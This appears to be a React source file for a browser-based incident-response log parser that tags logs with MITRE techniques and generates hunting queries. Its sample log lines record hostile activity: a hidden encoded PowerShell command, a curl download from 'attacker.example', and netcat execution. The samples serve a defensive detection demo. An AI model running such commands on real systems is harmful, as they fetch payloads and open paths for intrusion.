import { useMemo, useState } from 'react';
import { Link } from 'react-router-dom';
import { BackLink } from '../../components/BackLink';
import { SEVERITY_TONE } from '../../components/severity';
import { ArrowLeft, ScrollText, ClipboardCopy, Check, Crosshair, AlertTriangle, Filter } from 'lucide-react';
import {
  parseLogs,
  generateQueries,
  summariseBatch,
  type ParsedRecord,
  type LogFormat,
} from '../../lib/dfir/log-parser';

const SAMPLES: { label: string; value: string }[] = [
  {
    label: 'Sysmon EID 1 (PowerShell)',
    value: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="2026-05-10T08:14:22.123Z"/><Channel>Microsoft-Windows-Sysmon/Operational</Channel></System><EventData><Data Name="UtcTime">2026-05-10 08:14:22.123</Data><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAo</Data><Data Name="ParentImage">C:\\Windows\\explorer.exe</Data></EventData></Event>`,
  },
  {
    label: 'Security 4625 (logon failure)',
    value: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4625</EventID><TimeCreated SystemTime="2026-05-10T03:11:55.000Z"/><Channel>Security</Channel></System><EventData><Data Name="TargetUserName">administrator</Data><Data Name="WorkstationName">DC01</Data><Data Name="IpAddress">198.51.100.4</Data><Data Name="Status">0xc000006d</Data></EventData></Event>`,
  },
  {
    label: 'JSON-Line (osquery)',
    value: `{"name":"processes_snapshot","hostIdentifier":"web-01","calendarTime":"2026-05-10T07:50:01Z","columns":{"pid":"4321","name":"curl","cmdline":"curl -o /tmp/x http://attacker.example/p","parent":"22","uid":"0"}}`,
  },
  {
    label: 'syslog (auditd)',
    value: `<86>May 10 04:22:01 web-01 audit[1234]: type=EXECVE msg=audit(1715313721.123:456): comm="nc" exe="/usr/bin/nc" success=yes`,
  },
  {
    label: 'CEF / key=value',
    value: `time=2026-05-10T08:00:00Z host=fw-01 app=PaloAlto severity=high src=10.0.0.5 dst=8.8.8.8 dport=53 action=allow rule="dns-out" msg="dns-tunneling-suspect"`,
  },
];

const FORMAT_LABEL: Record<LogFormat, string> = {
  'win-event-xml': 'WinEvent XML',
  jsonl: 'JSON-Line',
  syslog: 'syslog',
  kv: 'key=value',
  raw: 'raw',
};

const FORMAT_PILL: Record<LogFormat, string> = {
  'win-event-xml': 'border-violet-500/40 bg-violet-500/10 text-violet-700 dark:text-violet-300',
  jsonl: 'border-cyan-500/40 bg-cyan-500/10 text-cyan-700 dark:text-cyan-300',
  syslog: 'border-amber-500/40 bg-amber-500/10 text-amber-700 dark:text-amber-300',
  kv: 'border-emerald-500/40 bg-emerald-500/10 text-emerald-700 dark:text-emerald-300',
  raw: 'border-slate-300 dark:border-[rgb(var(--border-400))] text-slate-500',
};

export default function LogParser(): JSX.Element {
  const [input, setInput] = useState('');
  const [severityFilter, setSeverityFilter] = useState<Set<ParsedRecord['severity']>>(new Set());
  const [copied, setCopied] = useState<string | null>(null);

  const records = useMemo(() => (input.trim() ? parseLogs(input) : []), [input]);
  const summary = useMemo(() => summariseBatch(records), [records]);
  const queries = useMemo(() => generateQueries(records), [records]);

  const filteredRecords = useMemo(() => {
    if (severityFilter.size === 0) return records;
    return records.filter((r) => severityFilter.has(r.severity));
  }, [records, severityFilter]);

  const toggleSeverity = (s: ParsedRecord['severity']) => {
    setSeverityFilter((prev) => {
      const next = new Set(prev);
      if (next.has(s)) next.delete(s);
      else next.add(s);
      return next;
    });
  };

  const copy = async (key: string, text: string) => {
    await navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1200);
  };

  return (
    <div className="max-w-6xl mx-auto px-4 sm:px-8 py-12 text-slate-900 dark:text-slate-100">
      <BackLink
        to="/dfir"
        className="inline-flex items-center gap-2 text-sm text-muted hover:text-brand-600 dark:hover:text-brand-400 mb-8 font-mono"
      >
        <ArrowLeft size={14} /> back
      </BackLink>

      <div className="animate-fade-in-up">
        <h1 className="text-3xl sm:text-4xl font-display font-bold mb-2 flex items-center gap-3">
          <ScrollText size={28} className="text-brand-600 dark:text-brand-400" /> Log Parser
        </h1>
        <p className="text-muted mb-2 max-w-3xl leading-relaxed">
          Paste raw log lines — Sysmon / Windows Security / syslog / JSON-line / key=value. Each line is auto-detected,
          parsed into a structured record, and tagged with MITRE ATT&amp;CK techniques where heuristics fire. Hunting
          queries are generated for Splunk SPL, Elastic KQL, and Microsoft Sentinel KQL.
        </p>
        <p className="text-xs text-slate-500 dark:text-slate-400 font-mono mb-8">
          Pure client-side. Nothing leaves your browser. MITRE tagging is conservative — only fires on confident matches
          (Sysmon EID + cmdline pattern, Security 4625, etc). Treat this as a triage starting point.
        </p>
      </div>

      <section className="rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] shadow-e1 p-4 mb-6">
        <div className="flex flex-wrap items-center justify-between gap-2 mb-3">
          <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-slate-500 dark:text-slate-400 font-mono">
            Input
          </h2>
          <div className="flex flex-wrap gap-1.5">
            {SAMPLES.map((s) => (
              <button
                key={s.label}
                type="button"
                onClick={() => setInput(s.value)}
                className="text-mini font-mono px-2 py-1 rounded border border-slate-300 dark:border-[rgb(var(--border-400))] hover:border-brand-500/40 hover:text-brand-600 dark:hover:text-brand-400"
              >
                {s.label}
              </button>
            ))}
          </div>
        </div>
        <label htmlFor="logparser-input" className="sr-only">
          Log lines to parse
        </label>
        <textarea
          id="logparser-input"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder="Paste log lines here — one per line, or paste a multi-line WinEvent XML blob (will be auto-collapsed per Event)…"
          rows={14}
          aria-label="Log lines input"
          className="w-full px-3 py-2 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-[rgb(var(--border-400))] rounded font-mono text-mini text-slate-900 dark:text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-brand-500 dark:focus:border-brand-400"
          spellCheck={false}
        />
      </section>

      {records.length > 0 && (
        <>
          {/* Summary */}
          <section className="rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] shadow-e1 p-4 mb-6">
            <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-slate-500 dark:text-slate-400 font-mono mb-3">
              Batch summary
            </h2>
            <div className="grid sm:grid-cols-3 gap-4 mb-3">
              <div>
                <div className="text-2xl font-bold text-slate-900 dark:text-slate-100">{summary.total}</div>
                <div className="text-mini font-mono text-slate-500 dark:text-slate-400">total lines</div>
              </div>
              <div>
                <div className="text-2xl font-bold text-slate-900 dark:text-slate-100">
                  {summary.unique_techniques.length}
                </div>
                <div className="text-mini font-mono text-slate-500 dark:text-slate-400">unique MITRE techniques</div>
              </div>
              <div>
                <div className="text-2xl font-bold text-slate-900 dark:text-slate-100">
                  {summary.unique_event_ids.length}
                </div>
                <div className="text-mini font-mono text-slate-500 dark:text-slate-400">unique event IDs</div>
              </div>
            </div>
            <div className="flex flex-wrap gap-2">
              {(Object.keys(summary.by_format) as LogFormat[])
                .filter((f) => summary.by_format[f] > 0)
                .map((f) => (
                  <span
                    key={f}
                    className={`text-micro font-mono uppercase tracking-wider px-1.5 py-0.5 rounded border ${FORMAT_PILL[f]}`}
                  >
                    {FORMAT_LABEL[f]} · {summary.by_format[f]}
                  </span>
                ))}
              {summary.unique_techniques.length > 0 && (
                <details className="w-full mt-2">
                  <summary className="text-mini font-mono text-muted cursor-pointer">
                    Techniques: {summary.unique_techniques.join(', ')}
                  </summary>
                </details>
              )}
            </div>
          </section>

          {/* Severity filter */}
          <section className="flex flex-wrap items-center gap-2 mb-4">
            <Filter size={12} className="text-slate-500" />
            <span className="text-mini font-mono text-slate-500">filter:</span>
            {(['high', 'medium', 'low', 'info'] as const).map((s) => {
              const count = summary.by_severity[s];
              const active = severityFilter.size === 0 || severityFilter.has(s);
              return (
                <button
                  key={s}
                  type="button"
                  onClick={() => toggleSeverity(s)}
                  disabled={count === 0}
                  className={`text-mini font-mono px-2 py-1 rounded border ${active ? SEVERITY_TONE[s] : 'border-slate-200 dark:border-[rgb(var(--border-400))] text-slate-500'} ${count === 0 ? 'opacity-30' : ''}`}
                >
                  {s} · {count}
                </button>
              );
            })}
            {severityFilter.size > 0 && (
              <button
                type="button"
                onClick={() => setSeverityFilter(new Set())}
                className="text-mini font-mono text-brand-600 dark:text-brand-400 hover:underline"
              >
                clear
              </button>
            )}
          </section>

          {/* Records */}
          <section className="space-y-2 mb-6">
            {filteredRecords.map((r, i) => (
              <article
                key={i}
                className="rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] shadow-e1 p-3"
              >
                <div className="flex flex-wrap items-baseline gap-2 mb-2">
                  <span
                    className={`text-micro font-mono uppercase tracking-wider px-1.5 py-0.5 rounded border ${FORMAT_PILL[r.format]}`}
                  >
                    {FORMAT_LABEL[r.format]}
                  </span>
                  <span
                    className={`text-micro font-mono uppercase tracking-wider px-1.5 py-0.5 rounded border ${SEVERITY_TONE[r.severity]}`}
                  >
                    {r.severity}
                  </span>
                  {r.event_id && (
                    <span className="text-mini font-mono text-slate-700 dark:text-slate-300">EID {r.event_id}</span>
                  )}
                  {r.source && (
                    <span className="text-mini font-mono text-slate-500 dark:text-slate-400">{r.source}</span>
                  )}
                  {r.timestamp && (
                    <span className="text-mini font-mono text-slate-500 dark:text-slate-400 ml-auto">
                      {r.timestamp}
                    </span>
                  )}
                </div>

                {r.mitre_techniques.length > 0 && (
                  <div className="flex flex-wrap items-center gap-1.5 mb-2">
                    <Crosshair size={10} className="text-rose-500" />
                    {r.mitre_techniques.map((t) => (
                      <Link
                        key={t}
                        to={`/threatintel/mitre?id=${t}`}
                        className="text-micro font-mono uppercase tracking-wider px-1.5 py-0.5 rounded border border-rose-500/40 bg-rose-500/10 text-rose-700 dark:text-rose-300 hover:bg-rose-500/20"
                      >
                        {t}
                      </Link>
                    ))}
                  </div>
                )}

                {r.notes.length > 0 && (
                  <ul className="text-mini font-mono text-amber-700 dark:text-amber-300 mb-2 space-y-0.5">
                    {r.notes.map((n, j) => (
                      <li key={j} className="inline-flex items-start gap-1">
                        <AlertTriangle size={10} className="mt-0.5 shrink-0" /> {n}
                      </li>
                    ))}
                  </ul>
                )}

                <details>
                  <summary className="text-mini font-mono text-slate-500 dark:text-slate-400 cursor-pointer">
                    {Object.keys(r.fields).length} parsed field{Object.keys(r.fields).length === 1 ? '' : 's'} — show
                    structured JSON
                  </summary>
                  <pre className="mt-2 text-mini font-mono text-slate-700 dark:text-slate-300 whitespace-pre-wrap break-all bg-slate-50 dark:bg-slate-950 rounded p-2 border border-slate-200 dark:border-[rgb(var(--border-400))] max-h-60 overflow-auto">
                    {JSON.stringify(r.fields, null, 2)}
                  </pre>
                </details>
              </article>
            ))}
          </section>

          {/* Hunting queries */}
          {queries.length > 0 && (
            <section className="rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] shadow-e1 p-4 mb-6">
              <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-slate-500 dark:text-slate-400 font-mono mb-3">
                Hunting queries
              </h2>
              <ul className="space-y-3">
                {queries.map((q, i) => {
                  const id = `q-${i}`;
                  return (
                    <li
                      key={id}
                      className="rounded border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-slate-950 p-3"
                    >
                      <div className="flex items-baseline justify-between gap-2 mb-2">
                        <h3 className="text-meta font-mono text-slate-700 dark:text-slate-300">{q.label}</h3>
                        <button
                          type="button"
                          onClick={() => void copy(id, q.query)}
                          className="text-mini font-mono text-brand-600 dark:text-brand-400 hover:underline inline-flex items-center gap-1"
                        >
                          {copied === id ? <Check size={11} /> : <ClipboardCopy size={11} />}
                          {copied === id ? 'copied' : 'copy'}
                        </button>
                      </div>
                      <pre className="text-mini font-mono text-slate-900 dark:text-slate-100 whitespace-pre-wrap break-all">
                        {q.query}
                      </pre>
                    </li>
                  );
                })}
              </ul>
            </section>
          )}
        </>
      )}
    </div>
  );
}
